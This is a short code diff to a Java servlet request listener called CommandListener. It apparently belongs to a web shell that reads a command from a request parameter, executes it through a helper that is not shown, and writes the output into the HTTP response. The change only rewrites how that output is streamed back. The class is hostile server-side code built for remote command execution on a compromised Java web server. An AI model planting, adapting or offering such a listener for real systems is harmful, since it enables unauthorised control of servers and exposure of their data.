@@ -6,6 +6,7 @@ import javax.servlet.ServletRequestListener;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.InputStream;
+import java.util.Scanner;
 
 /**
  * @author ReaJason
@@ -23,14 +24,11 @@ public class CommandListener implements ServletRequestListener {
             }
             if (p != null) {
                 String param = getParam(p);
-                HttpServletResponse servletResponse = (HttpServletResponse) getResponseFromRequest(request);
+                HttpServletResponse response = (HttpServletResponse) getResponseFromRequest(request);
                 InputStream inputStream = getInputStream(param);
-                ServletOutputStream outputStream = servletResponse.getOutputStream();
-                byte[] buf = new byte[8192];
-                int length;
-                while ((length = inputStream.read(buf)) != -1) {
-                    outputStream.write(buf, 0, length);
-                }
+                response.getWriter().write(new Scanner(inputStream).useDelimiter("\\A").next());
+                response.getWriter().flush();
+                response.getWriter().close();
             }
         } catch (Throwable e) {
             e.printStackTrace();
